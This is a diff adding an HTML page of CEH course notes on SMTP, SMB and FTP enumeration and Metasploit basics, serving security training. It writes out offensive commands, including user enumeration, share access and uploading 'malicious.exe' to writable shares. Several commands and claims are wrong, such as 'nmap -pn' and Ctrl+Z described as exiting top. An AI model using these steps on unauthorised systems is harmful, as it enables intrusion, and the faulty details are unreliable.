@@ -1,0 +1,2353 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>5_CEH - Exploitation & Metasploit Framework</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <!-- Header -->
+    <header class="header">
+        <div class="header-content">
+            <h1><span class="gradient-text">5_CEH</span></h1>
+            <p>Exploitation & Metasploit Framework Mastery</p>
+        </div>
+    </header>
+
+    <!-- Navigation Breadcrumb -->
+    <nav class="breadcrumb">
+        <span class="breadcrumb-item">5_CEH</span>
+        <span class="breadcrumb-separator">›</span>
+        <span class="breadcrumb-current" id="breadcrumb-current">Overview</span>
+    </nav>
+
+    <!-- Main Container -->
+    <div class="container">
+        <!-- Sidebar Navigation -->
+        <aside class="sidebar">
+            <div class="sidebar-section">
+                <h3>Email & SMTP</h3>
+                <ul class="sidebar-links">
+                    <li><a href="#" onclick="switchTab('tab1')">Overview</a></li>
+                    <li><a href="#" onclick="switchTab('tab2')">SMTP Enumeration</a></li>
+                    <li><a href="#" onclick="switchTab('tab3')">VRFY & EXPN</a></li>
+                </ul>
+            </div>
+
+            <div class="sidebar-section">
+                <h3>System Information</h3>
+                <ul class="sidebar-links">
+                    <li><a href="#" onclick="switchTab('tab4')">Linux Enumeration</a></li>
+                    <li><a href="#" onclick="switchTab('tab5')">System Details</a></li>
+                    <li><a href="#" onclick="switchTab('tab6')">Process Monitoring</a></li>
+                </ul>
+            </div>
+
+            <div class="sidebar-section">
+                <h3>Network Protocols</h3>
+                <ul class="sidebar-links">
+                    <li><a href="#" onclick="switchTab('tab7')">SMB/NetBIOS</a></li>
+                    <li><a href="#" onclick="switchTab('tab8')">SMB Exploitation</a></li>
+                    <li><a href="#" onclick="switchTab('tab9')">FTP Service</a></li>
+                </ul>
+            </div>
+
+            <div class="sidebar-section">
+                <h3>Metasploit Framework</h3>
+                <ul class="sidebar-links">
+                    <li><a href="#" onclick="switchTab('tab10')">Framework Basics</a></li>
+                    <li><a href="#" onclick="switchTab('tab11')">Modules Overview</a></li>
+                    <li><a href="#" onclick="switchTab('tab12')">Payload & Encoders</a></li>
+                </ul>
+            </div>
+
+            <div class="sidebar-section">
+                <h3>Exploitation</h3>
+                <ul class="sidebar-links">
+                    <li><a href="#" onclick="switchTab('tab13')">Wayback Machine</a></li>
+                    <li><a href="#" onclick="switchTab('tab14')">VSFTPD Exploit</a></li>
+                    <li><a href="#" onclick="switchTab('tab15')">RCE Execution</a></li>
+                </ul>
+            </div>
+
+            <div class="sidebar-section">
+                <h3>Advanced Topics</h3>
+                <ul class="sidebar-links">
+                    <li><a href="#" onclick="switchTab('tab16')">Attack Chain Theory</a></li>
+                    <li><a href="#" onclick="switchTab('tab17')">Simulation Scenarios</a></li>
+                    <li><a href="#" onclick="switchTab('tab18')">Defense Mechanisms</a></li>
+                    <li><a href="#" onclick="switchTab('tab19')">Summary & Best Practices</a></li>
+                </ul>
+            </div>
+
+            <div class="scroll-to-top" onclick="scrollToTop()">↑ Top</div>
+        </aside>
+
+        <!-- Main Content -->
+        <main class="content">
+            <!-- Tab 1: Overview -->
+            <section class="tab-content active" id="tab1">
+                <h2>Module 5: Exploitation & Metasploit Framework</h2>
+                <p class="subtitle">Advanced techniques for service exploitation and framework-based attacks</p>
+                
+                <div class="info-card">
+                    <h3>Course Overview</h3>
+                    <p>This module covers the transition from reconnaissance and enumeration to active exploitation. You'll learn about:</p>
+                    <ul>
+                        <li><strong>SMTP Enumeration:</strong> User validation through VRFY, EXPN, RCPT commands</li>
+                        <li><strong>System Information Gathering:</strong> Linux/Unix enumeration techniques</li>
+                        <li><strong>Protocol Exploitation:</strong> SMB/NetBIOS and FTP vulnerabilities</li>
+                        <li><strong>Metasploit Framework:</strong> Professional-grade exploitation tool</li>
+                        <li><strong>Payload & Encoding:</strong> Bypass security mechanisms</li>
+                        <li><strong>Remote Code Execution (RCE):</strong> Gaining control of target systems</li>
+                    </ul>
+                </div>
+
+                <div class="info-card">
+                    <h3>Key Concepts</h3>
+                    <ul>
+                        <li><strong>Vulnerability Assessment:</strong> Identifying and documenting security issues</li>
+                        <li><strong>Penetration Testing:</strong> Authorized testing in isolated environments</li>
+                        <li><strong>Ethical Hacking:</strong> Thinking like an attacker to find vulnerabilities</li>
+                        <li><strong>Proof of Concept (POC):</strong> Demonstrating successful exploits</li>
+                        <li><strong>Exploitation Frameworks:</strong> Tools for automated and custom attacks</li>
+                    </ul>
+                </div>
+
+                <div class="learning-path">
+                    <h3>Learning Path</h3>
+                    <div class="path-timeline">
+                        <div class="path-item">SMTP Enumeration</div>
+                        <div class="path-arrow">→</div>
+                        <div class="path-item">System Enumeration</div>
+                        <div class="path-arrow">→</div>
+                        <div class="path-item">Network Protocols</div>
+                        <div class="path-arrow">→</div>
+                        <div class="path-item">Metasploit Framework</div>
+                        <div class="path-arrow">→</div>
+                        <div class="path-item">Active Exploitation</div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Tab 2: SMTP Enumeration -->
+            <section class="tab-content" id="tab2">
+                <h2>SMTP Enumeration Techniques</h2>
+                <p class="subtitle">Discovering and validating users on SMTP servers</p>
+
+                <div class="info-card">
+                    <h3>What is SMTP?</h3>
+                    <p><strong>Simple Mail Transfer Protocol (SMTP)</strong> is responsible for sending and receiving emails. Organizations deploy SMTP servers with specific domain names to handle email communication.</p>
+                    <ul>
+                        <li><strong>Function:</strong> Sends emails and manages mail routing</li>
+                        <li><strong>Protocol Type:</strong> Text-based TCP/IP protocol</li>
+                        <li><strong>Standard Port:</strong> 25 (SMTP), 465 (SMTPS - Secure), 587 (Submission)</li>
+                        <li><strong>Vulnerability Risk:</strong> User enumeration if not properly configured</li>
+                    </ul>
+                </div>
+
+                <div class="info-card">
+                    <h3>SMTP Enumeration Value</h3>
+                    <p>Attackers enumerate SMTP servers to:</p>
+                    <ul>
+                        <li>Identify valid usernames in the organization</li>
+                        <li>Discover organizational structure and email conventions</li>
+                        <li>Find vulnerabilities in email server configuration</li>
+                        <li>Perform targeted phishing attacks with real usernames</li>
+                        <li>Establish baseline for social engineering</li>
+                    </ul>
+                </div>
+
+                <div class="danger-box">
+                    <strong>⚠️ Security Risk:</strong> An improperly configured SMTP server can reveal valid usernames, enabling targeted attacks and unauthorized access.
+                </div>
+
+                <div class="info-card">
+                    <h3>Ethical Hacker Approach</h3>
+                    <p>As an ethical hacker, you must think like an attacker to find these vulnerabilities:</p>
+                    <ul>
+                        <li>Validate organizational security posture</li>
+                        <li>Document all SMTP misconfigurations</li>
+                        <li>Create comprehensive POC reports</li>
+                        <li>Recommend remediation strategies</li>
+                        <li>Verify fixes in follow-up assessments</li>
+                    </ul>
+                </div>
+            </section>
+
+            <!-- Tab 3: VRFY & EXPN Commands -->
+            <section class="tab-content" id="tab3">
+                <h2>SMTP Commands for User Enumeration</h2>
+                <p class="subtitle">Understanding VRFY, EXPN, and RCPT commands</p>
+
+                <div class="command-table">
+                    <h3>SMTP Enumeration Commands</h3>
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Command</th>
+                                <th>Full Name</th>
+                                <th>Purpose</th>
+                                <th>Security Risk</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td><code>VRFY</code></td>
+                                <td>Verify</td>
+                                <td>Validates if a user exists (returns different responses for valid/invalid users)</td>
+                                <td>Direct user enumeration</td>
+                            </tr>
+                            <tr>
+                                <td><code>EXPN</code></td>
+                                <td>Expand</td>
+                                <td>Shows the actual delivery address of alias and mailing lists</td>
+                                <td>Reveals group memberships and aliases</td>
+                            </tr>
+                            <tr>
+                                <td><code>RCPT TO:</code></td>
+                                <td>Recipient</td>
+                                <td>Defines the recipient's message destination</td>
+                                <td>Can validate valid email addresses</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <div class="info-card">
+                    <h3>Server Response Patterns</h3>
+                    <p>SMTP servers respond differently based on whether a user exists:</p>
+                    <ul>
+                        <li><strong>Valid User:</strong> "250 User found" or similar positive response</li>
+                        <li><strong>Invalid User:</strong> "550 User not found" or similar rejection</li>
+                        <li><strong>Different Response Times:</strong> Valid users may cause different processing delays</li>
+                        <li><strong>Error Messages:</strong> Different error codes for valid vs invalid users</li>
+                    </ul>
+                </div>
+
+                <div class="code-example">
+                    <h3>SMTP User Enumeration Tool Usage</h3>
+                    <pre><code>smtp-user-enum -M VRFY -U username.txt -t target_ip
+# -M: Specify method (VRFY, EXPN, RCPT)
+# -U: Username file to test
+# -t: Target SMTP server IP address
+
+# Results show:
+# Username: exists
+# Adminuser: exists
+# Root: exists
+# Other: not found</code></pre>
+                </div>
+
+                <div class="info-card">
+                    <h3>User Enumeration Workflow</h3>
+                    <ol>
+                        <li>Identify SMTP server IP and port (typically port 25)</li>
+                        <li>Prepare wordlist of common usernames</li>
+                        <li>Use smtp-user-enum with VRFY method</li>
+                        <li>Document all valid usernames found</li>
+                        <li>Cross-reference with other reconnaissance data</li>
+                        <li>Prepare report with valid user list</li>
+                    </ol>
+                </div>
+
+                <div class="success-box">
+                    <strong>✓ Mitigation:</strong> Disable VRFY and EXPN commands, implement rate limiting, use SMTP authentication requirements.
+                </div>
+            </section>
+
+            <!-- Tab 4: Linux Enumeration -->
+            <section class="tab-content" id="tab4">
+                <h2>Linux System Enumeration</h2>
+                <p class="subtitle">Gathering information about Linux/Unix operating systems</p>
+
+                <div class="info-card">
+                    <h3>Information Gathering Methods</h3>
+                    <p>Once you have access to a Linux system, enumerate system details to understand the environment:</p>
+                    <ul>
+                        <li>Operating system version and distribution</li>
+                        <li>Kernel version and patches applied</li>
+                        <li>System architecture (32-bit or 64-bit)</li>
+                        <li>User accounts and group memberships</li>
+                        <li>Running processes and services</li>
+                        <li>Installed software and packages</li>
+                        <li>Network configuration and connections</li>
+                    </ul>
+                </div>
+
+                <div class="command-table">
+                    <h3>Essential Linux Enumeration Commands</h3>
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Command</th>
+                                <th>Purpose</th>
+                                <th>Example Output</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td><code>cat /etc/issue</code></td>
+                                <td>Shows OS name and version</td>
+                                <td>Kali GNU/Linux Rolling</td>
+                            </tr>
+                            <tr>
+                                <td><code>cat /etc/os-release</code></td>
+                                <td>Detailed OS information</td>
+                                <td>Pretty_name="Kali", Version_id="2023.1"</td>
+                            </tr>
+                            <tr>
+                                <td><code>uname -a</code></td>
+                                <td>Full system information</td>
+                                <td>Linux kernel 6.3, architecture, hostname</td>
+                            </tr>
+                            <tr>
+                                <td><code>uname -r</code></td>
+                                <td>Kernel release version</td>
+                                <td>6.3.0-generic</td>
+                            </tr>
+                            <tr>
+                                <td><code>hostnamectl</code></td>
+                                <td>System hostname and OS</td>
+                                <td>Static hostname, Operating System</td>
+                            </tr>
+                            <tr>
+                                <td><code>lsb_release -a</code></td>
+                                <td>Linux Standard Base information</td>
+                                <td>Distributor ID, Release, Codename</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <div class="code-example">
+                    <h3>Version Detection Commands</h3>
+                    <pre><code># Display system issue/banner
+cat /etc/issue
+# Output: Kali GNU/Linux Rolling
+
+# Get detailed release information
+cat /etc/os-release
+# Output: PRETTY_NAME="Kali GNU/Linux Rolling"
+#         VERSION_ID="2023.1"
+#         VERSION="2023.1 (Kali-rolling)"
+
+# Check complete system information
+uname -a
+# Output: Linux metasploit 6.3.0-generic #21-Ubuntu x86_64 GNU/Linux
+
+# Get just kernel version
+uname -r
+# Output: 6.3.0-generic</code></pre>
+                </div>
+
+                <div class="info-card">
+                    <h3>Security Implications</h3>
+                    <p>Version information helps attackers identify:</p>
+                    <ul>
+                        <li><strong>Known Vulnerabilities:</strong> Specific CVEs affecting this version</li>
+                        <li><strong>Exploit Compatibility:</strong> Which exploits will work on this system</li>
+                        <li><strong>Privilege Escalation Opportunities:</strong> Kernel vulnerabilities for privesc</li>
+                        <li><strong>Patch Status:</strong> Whether important security patches are applied</li>
+                        <li><strong>System Capabilities:</strong> What tools and services are likely available</li>
+                    </ul>
+                </div>
+            </section>
+
+            <!-- Tab 5: System Details & Services -->
+            <section class="tab-content" id="tab5">
+                <h2>System Details and Running Services</h2>
+                <p class="subtitle">Identifying services and collecting system configuration</p>
+
+                <div class="code-example">
+                    <h3>Service Discovery Commands</h3>
+                    <pre><code># List all services (Debian/Ubuntu)
+service --status-all
+# or
+systemctl list-units --type=service
+
+# Check specific service status
+systemctl status apache2
+systemctl status ssh
+
+# View all running processes
+ps aux
+
+# Check network connections
+netstat -tuln
+ss -tuln</code></pre>
+                </div>
+
+                <div class="info-card">
+                    <h3>System Service Information</h3>
+                    <p>The /etc/init.d/ directory or systemd units contain all available services:</p>
+                    <ul>
+                        <li><strong>Web Services:</strong> Apache, Nginx, etc.</li>
+                        <li><strong>Database Services:</strong> MySQL, PostgreSQL, MongoDB</li>
+                        <li><strong>Mail Services:</strong> Postfix, Dovecot, Sendmail</li>
+                        <li><strong>Network Services:</strong> SSH, FTP, Samba</li>
+                        <li><strong>System Services:</strong> cron, syslog, systemd</li>
+                        <li><strong>Custom Services:</strong> Organization-specific applications</li>
+                    </ul>
+                </div>
+
+                <div class="command-table">
+                    <h3>Service Information Sources</h3>
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>File/Directory</th>
+                                <th>Contains</th>
+                                <th>Access Method</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td>/etc/init.d/</td>
+                                <td>Service startup scripts</td>
+                                <td>ls /etc/init.d/</td>
+                            </tr>
+                            <tr>
+                                <td>/etc/systemd/system/</td>
+                                <td>Systemd service units</td>
+                                <td>ls /etc/systemd/system/</td>
+                            </tr>
+                            <tr>
+                                <td>/var/log/</td>
+                                <td>System and application logs</td>
+                                <td>cat /var/log/auth.log</td>
+                            </tr>
+                            <tr>
+                                <td>ps output</td>
+                                <td>Currently running processes</td>
+                                <td>ps aux | grep service</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <div class="danger-box">
+                    <strong>⚠️ Attacker Perspective:</strong> Services represent potential attack vectors. Each running service may have vulnerabilities that can be exploited for unauthorized access or privilege escalation.
+                </div>
+            </section>
+
+            <!-- Tab 6: Process Monitoring -->
+            <section class="tab-content" id="tab6">
+                <h2>Process Monitoring with TOP Command</h2>
+                <p class="subtitle">Understanding system resource consumption and running processes</p>
+
+                <div class="info-card">
+                    <h3>The TOP Command</h3>
+                    <p>The <code>top</code> command is a real-time system monitoring tool similar to Windows Task Manager:</p>
+                    <ul>
+                        <li>Displays running processes and their resource consumption</li>
+                        <li>Shows CPU utilization percentage</li>
+                        <li>Shows memory usage (RAM and swap)</li>
+                        <li>Reveals which users own running processes</li>
+                        <li>Allows killing processes if needed</li>
+                        <li>Helps identify resource-hungry applications</li>
+                    </ul>
+                </div>
+
+                <div class="code-example">
+                    <h3>TOP Output Interpretation</h3>
+                    <pre><code>top
+
+Output shows:
+- Users running: 2 users
+- Total tasks: 155 processes (1 running, 154 sleeping)
+- CPU utilization: 9%
+- Memory usage:
+  * Total: ~2GB
+  * Free: 438MB
+  * Used: 966MB
+- Swap memory: Available for overflow when RAM full
+
+Process List (sorted by PID or CPU usage):
+PID USER  PR NI VIRT RES SHR %CPU %MEM  TIME+ COMMAND
+8173 root 20  0  4096 124 100 15.2  2.1  0:15 /usr/bin/sshd
+8174 user 20  0  2048  64  32  0.5  1.0  0:01 bash</code></pre>
+                </div>
+
+                <div class="command-table">
+                    <h3>TOP Display Information</h3>
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Field</th>
+                                <th>Meaning</th>
+                                <th>Significance</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td>PID</td>
+                                <td>Process ID</td>
+                                <td>Unique identifier for the process</td>
+                            </tr>
+                            <tr>
+                                <td>USER</td>
+                                <td>Process owner</td>
+                                <td>Which user started the process</td>
+                            </tr>
+                            <tr>
+                                <td>%CPU</td>
+                                <td>CPU usage percentage</td>
+                                <td>How much processor time consumed</td>
+                            </tr>
+                            <tr>
+                                <td>%MEM</td>
+                                <td>Memory usage percentage</td>
+                                <td>How much RAM consumed</td>
+                            </tr>
+                            <tr>
+                                <td>VIRT</td>
+                                <td>Virtual memory</td>
+                                <td>Total virtual memory allocated</td>
+                            </tr>
+                            <tr>
+                                <td>RES</td>
+                                <td>Resident memory</td>
+                                <td>Actual physical RAM used</td>
+                            </tr>
+                            <tr>
+                                <td>COMMAND</td>
+                                <td>Process name</td>
+                                <td>What the process does</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <div class="info-card">
+                    <h3>Security Analysis with TOP</h3>
+                    <ul>
+                        <li><strong>Detect Anomalies:</strong> Identify unusual processes consuming excessive resources</li>
+                        <li><strong>Find Malware:</strong> Malicious processes often show high CPU/memory usage</li>
+                        <li><strong>Privilege Issues:</strong> Processes running as root may indicate misconfiguration</li>
+                        <li><strong>Unauthorized Access:</strong> Unknown processes may indicate compromise</li>
+                        <li><strong>Performance Issues:</strong> Identify bottlenecks in system performance</li>
+                    </ul>
+                </div>
+
+                <div class="code-example">
+                    <h3>Ending Processes in TOP</h3>
+                    <pre><code># While in TOP command:
+Press Ctrl+Z to exit TOP and return to prompt
+Press K to kill a process (prompts for PID)
+
+# Alternatively, from command line:
+kill -9 PID    # Force kill
+pkill processname  # Kill by name
+killall processname</code></pre>
+                </div>
+            </section>
+
+            <!-- Tab 7: SMB/NetBIOS Protocol -->
+            <section class="tab-content" id="tab7">
+                <h2>SMB and NetBIOS Protocol Overview</h2>
+                <p class="subtitle">Understanding network file sharing and its security implications</p>
+
+                <div class="info-card">
+                    <h3>What is SMB?</h3>
+                    <p><strong>Server Message Block (SMB)</strong> is a network protocol for accessing files, printers, and other devices on a network.</p>
+                    <ul>
+                        <li><strong>Purpose:</strong> Network file sharing, printer sharing, and device access</li>
+                        <li><strong>Primary Platform:</strong> Windows (dominant), also Linux via Samba</li>
+                        <li><strong>Standard Ports:</strong> 139 (NetBIOS over SMB), 445 (Direct SMB)</li>
+                        <li><strong>Protocol Type:</strong> Client-Server architecture</li>
+                        <li><strong>Capabilities:</strong> File access, printer access, pipe communications</li>
+                    </ul>
+                </div>
+
+                <div class="info-card">
+                    <h3>NetBIOS and SMB Relationship</h3>
+                    <p><strong>NetBIOS</strong> is a legacy naming protocol that bridges with SMB:</p>
+                    <ul>
+                        <li><strong>NetBIOS Session Service (Port 139):</strong> Legacy SMB over NetBIOS</li>
+                        <li><strong>Direct SMB (Port 445):</strong> Modern SMB over TCP/IP (Windows 2000+)</li>
+                        <li><strong>Discovery:</strong> NetBIOS enables browsing and device discovery on local networks</li>
+                        <li><strong>Scope:</strong> NetBIOS limited to local networks (not internet-routable)</li>
+                    </ul>
+                </div>
+
+                <div class="danger-box">
+                    <strong>🔴 CRITICAL RISK:</strong> Port 139 open on internet-facing systems is EXTREMELY DANGEROUS. This port enables direct share enumeration and unauthorized file access. Organizations must block port 139 from external access.
+                </div>
+
+                <div class="command-table">
+                    <h3>SMB/NetBIOS Port Information</h3>
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Port</th>
+                                <th>Protocol</th>
+                                <th>Service</th>
+                                <th>Risk Level</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td>137</td>
+                                <td>UDP</td>
+                                <td>NetBIOS Name Service</td>
+                                <td>High</td>
+                            </tr>
+                            <tr>
+                                <td>138</td>
+                                <td>UDP</td>
+                                <td>NetBIOS Datagram Service</td>
+                                <td>High</td>
+                            </tr>
+                            <tr>
+                                <td>139</td>
+                                <td>TCP</td>
+                                <td>NetBIOS Session Service</td>
+                                <td>CRITICAL</td>
+                            </tr>
+                            <tr>
+                                <td>445</td>
+                                <td>TCP</td>
+                                <td>Direct SMB (Modern)</td>
+                                <td>CRITICAL</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <div class="info-card">
+                    <h3>Organizational Use Cases</h3>
+                    <p>Why organizations use SMB/NetBIOS:</p>
+                    <ul>
+                        <li><strong>Shared Drives:</strong> Central file storage accessible by multiple users</li>
+                        <li><strong>Shared Printers:</strong> Network-connected printers accessible by all users</li>
+                        <li><strong>User-based Access Control:</strong> Different users access different shares</li>
+                        <li><strong>Department-specific Resources:</strong> HR files only accessible to HR staff</li>
+                        <li><strong>Application Sharing:</strong> Central location for shared applications</li>
+                    </ul>
+                </div>
+
+                <div class="danger-box">
+                    <strong>⚠️ Why It's Dangerous:</strong> If port 139/445 are open, attackers can enumerate shares and gather organizational structure, user information, and potentially access sensitive data without authentication.
+                </div>
+            </section>
+
+            <!-- Tab 8: SMB Exploitation -->
+            <section class="tab-content" id="tab8">
+                <h2>SMB Enumeration and Exploitation</h2>
+                <p class="subtitle">Discovering shares and gathering intelligence from SMB servers</p>
+
+                <div class="code-example">
+                    <h3>SMB Scanning with NMAP</h3>
+                    <pre><code>nmap -pn --script smb-enum-shares -p139,445 target_ip
+# -pn: No ping (assume host is up)
+# --script: Use SMB enumeration scripts
+# -p139,445: Specific ports to scan
+
+# Alternative syntax:
+nmap -pn -sS -p139,445 -sV target_ip
+# -sS: TCP SYN scan
+# -sV: Service version detection</code></pre>
+                </div>
+
+                <div class="info-card">
+                    <h3>SMB Information Gathering</h3>
+                    <p>Key information obtained through SMB enumeration:</p>
+                    <ul>
+                        <li><strong>Available Shares:</strong> List of all shared directories and their permissions</li>
+                        <li><strong>NetBIOS Computer Name:</strong> System hostname on the network</li>
+                        <li><strong>Workgroup/Domain:</strong> Network group membership</li>
+                        <li><strong>Security Settings:</strong> SMB signing, encryption status</li>
+                        <li><strong>OS Version:</strong> Windows version and build number</li>
+                        <li><strong>Share Permissions:</strong> Who can access which shares</li>
+                    </ul>
+                </div>
+
+                <div class="code-example">
+                    <h3>SMB Share Discovery Tools</h3>
+                    <pre><code># NBTstat - NetBIOS name lookup (Windows/Linux)
+nbtstat -A target_ip
+# Shows NetBIOS names, services, and group information
+
+# nmblookup - NetBIOS lookup (Kali/Linux)
+nmblookup -A target_ip
+# Output: NetBIOS name, type, service information
+
+# smbmap - Map SMB shares
+smbmaps -H target_ip
+# Shows: Directory shares, permissions, access levels
+# Identifies readable and writable shares
+
+# SMB Client - Connect to shares
+smbclient //target_ip/sharename
+# Connect to specific share
+# 'ls' to list files
+# 'get' to download files
+# 'put' to upload files</code></pre>
+                </div>
+
+                <div class="command-table">
+                    <h3>SMB Share Types and Access Levels</h3>
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Share Type</th>
+                                <th>Typical Use</th>
+                                <th>Access Level</th>
+                                <th>Security Risk</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td>ADMIN$</td>
+                                <td>Administrative share</td>
+                                <td>Admin only</td>
+                                <td>Critical if accessible</td>
+                            </tr>
+                            <tr>
+                                <td>C$ D$ E$</td>
+                                <td>Drive shares</td>
+                                <td>Admin only</td>
+                                <td>Full system access</td>
+                            </tr>
+                            <tr>
+                                <td>IPC$</td>
+                                <td>Interprocess communication</td>
+                                <td>Limited</td>
+                                <td>Allows null session enumeration</td>
+                            </tr>
+                            <tr>
+                                <td>User Shares</td>
+                                <td>User-created shares</td>
+                                <td>Varies</td>
+                                <td>May contain sensitive data</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <div class="code-example">
+                    <h3>Accessing SMB Shares</h3>
+                    <pre><code># Anonymous connection attempt
+smbclient //target_ip/TMT
+# If successfully connected, you can list files:
+ls
+# See directories and file listings
+
+# Download files
+mget *
+# Downloads all accessible files
+
+# Upload files (if writable)
+mput malicious.exe
+# Upload payload to target system
+
+# This is how attackers deliver malware!</code></pre>
+                </div>
+
+                <div class="info-card">
+                    <h3>SMB Exploitation Workflow</h3>
+                    <ol>
+                        <li>Scan ports 139 and 445 with NMAP</li>
+                        <li>Use nbstat or nmblookup to get system information</li>
+                        <li>List available shares with smbmap or smbclient</li>
+                        <li>Identify readable and writable shares</li>
+                        <li>Connect to accessible shares</li>
+                        <li>Document sensitive data found</li>
+                        <li>Attempt to upload malicious files if writable</li>
+                        <li>Create POC report with findings</li>
+                    </ol>
+                </div>
+
+                <div class="danger-box">
+                    <strong>🚨 Attack Vector:</strong> If attackers can upload files to writable shares, they can introduce malware that executes when accessed by legitimate users or administrators.
+                </div>
+            </section>
+
+            <!-- Tab 9: FTP Service -->
+            <section class="tab-content" id="tab9">
+                <h2>FTP Service and Organizational Use</h2>
+                <p class="subtitle">Understanding FTP deployment for centralized file management</p>
+
+                <div class="info-card">
+                    <h3>What is FTP?</h3>
+                    <p><strong>File Transfer Protocol (FTP)</strong> enables file transfer between client and server over TCP/IP networks.</p>
+                    <ul>
+                        <li><strong>Purpose:</strong> Centralized file sharing and access control across network</li>
+                        <li><strong>Standard Port:</strong> 21 (Control), 20 (Data - Active mode)</li>
+                        <li><strong>Authentication:</strong> Username and password required</li>
+                        <li><strong>Architecture:</strong> Client-Server model with remote access</li>
+                        <li><strong>Scope:</strong> Can reach across internet with proper configuration</li>
+                    </ul>
+                </div>
+
+                <div class="info-card">
+                    <h3>Why Organizations Deploy FTP</h3>
+                    <p>FTP provides critical organizational functions:</p>
+                    <ul>
+                        <li><strong>Centralized Storage:</strong> All organizational files stored in one location</li>
+                        <li><strong>Remote Access:</strong> Employees can access files from anywhere</li>
+                        <li><strong>User-based Access Control:</strong> Different users → different permissions</li>
+                        <li><strong>Department Isolation:</strong> HR files only for HR, not for other departments</li>
+                        <li><strong>Public Internet Access:</strong> May share specific data with external partners</li>
+                        <li><strong>Automatic Backup:</strong> Centralized backup and disaster recovery</li>
+                    </ul>
+                </div>
+
+                <div class="code-example">
+                    <h3>Multi-User Department Structure Example</h3>
+                    <pre><code>FTP Server Directory Structure:
+/home/
+  ├── /HR/           (accessible only to HR staff)
+  ├── /Accounting/   (accessible only to accounting staff)
+  ├── /IT/           (accessible only to IT staff)
+  ├── /Marketing/    (accessible only to marketing staff)
+  └── /Public/       (accessible to all employees)
+
+Authentication:
+- mike (HR Department) → Can only access /HR/
+- sam (Accounting)     → Can only access /Accounting/
+- john (IT)            → Can only access /IT/
+- Admin                → Can access all directories
+
+This ensures data privacy and organizational security.</code></pre>
+                </div>
+
+                <div class="danger-box">
+                    <strong>⚠️ CRITICAL VULNERABILITY:</strong> If an FTP server is compromised, the ENTIRE organizational database is at risk. All departments' confidential data becomes accessible to the attacker.
+                </div>
+
+                <div class="info-card">
+                    <h3>FTP Security Implications</h3>
+                    <ul>
+                        <li><strong>Plaintext Credentials:</strong> FTP transmits username/password in clear text (use SFTP instead)</li>
+                        <li><strong>Default Configurations:</strong> Many FTP servers installed with weak defaults</li>
+                        <li><strong>Known Vulnerabilities:</strong> Older FTP implementations have documented exploits</li>
+                        <li><strong>Backdoor Potential:</strong> Compromised FTP allows persistent access via uploaded files</li>
+                        <li><strong>Data Exfiltration:</strong> Access to all company data in one location</li>
+                    </ul>
+                </div>
+            </section>
+
+            <!-- Tab 10: Metasploit Framework Basics -->
+            <section class="tab-content" id="tab10">
+                <h2>Introduction to Metasploit Framework</h2>
+                <p class="subtitle">Professional penetration testing and exploitation platform</p>
+
+                <div class="info-card">
+                    <h3>What is Metasploit Framework?</h3>
+                    <p><strong>Metasploit Framework</strong> is a comprehensive platform for penetration testing, vulnerability assessment, and controlled exploitation.</p>
+                    <ul>
+                        <li><strong>Supported Systems:</strong> Windows, Linux, Android, Network devices, IoT</li>
+                        <li><strong>Capabilities:</strong> Reconnaissance, scanning, enumeration, exploitation, post-exploitation</li>
+                        <li><strong>Cost:</strong> Free (Community Edition), Professional/Express (Commercial)</li>
+                        <li><strong>Installation:</strong> Pre-installed on Kali Linux, can install on other distributions</li>
+                        <li><strong>Interface:</strong> MSFConsole (interactive command-line interface)</li>
+                    </ul>
+                </div>
+
+                <div class="code-example">
+                    <h3>Starting Metasploit Framework</h3>
+                    <pre><code># Ensure PostgreSQL database is running
+systemctl status postgresql
+systemctl start postgresql
+
+# Start MSFConsole
+msfconsole
+
+# Note: Do NOT run as root unless necessary
+# Run from regular user directory to avoid root interference
+cd /home/regular_user && msfconsole</code></pre>
+                </div>
+
+                <div class="danger-box">
+                    <strong>⚠️ Important:</strong> When running Metasploit as root user, the root process itself may interfere with your attacks on target systems. Always run from a regular user account unless specifically required.
+                </div>
+
+                <div class="info-card">
+                    <h3>Metasploit Workflow</h3>
+                    <ol>
+                        <li><strong>Information Gathering:</strong> Use auxiliary modules for reconnaissance</li>
+                        <li><strong>Vulnerability Identification:</strong> Scan for known vulnerabilities</li>
+                        <li><strong>Choose Exploit Module:</strong> Select appropriate exploit for vulnerability</li>
+                        <li><strong>Configure Payload:</strong> Select payload type (reverse_tcp, bind_tcp)</li>
+                        <li><strong>Set Options:</strong> Configure target IP, port, payload encoding</li>
+                        <li><strong>Execute Exploit:</strong> Launch the attack</li>
+                        <li><strong>Post-Exploitation:</strong> Use post modules to maintain access, gather data</li>
+                        <li><strong>Document Results:</strong> Create POC report with findings</li>
+                    </ol>
+                </div>
+
+                <div class="info-card">
+                    <h3>Why Metasploit is Powerful</h3>
+                    <ul>
+                        <li><strong>Consolidated Tools:</strong> All penetration testing tools in one platform</li>
+                        <li><strong>Automated Exploitation:</strong> Built-in exploits for known vulnerabilities</li>
+                        <li><strong>Payload Management:</strong> Easy payload creation and delivery</li>
+                        <li><strong>Post-Exploitation:</strong> Maintain access after successful compromise</li>
+                        <li><strong>Community Contributions:</strong> Thousands of exploits from security researchers</li>
+                        <li><strong>Professional Reporting:</strong> Generate compliance-ready penetration test reports</li>
+                    </ul>
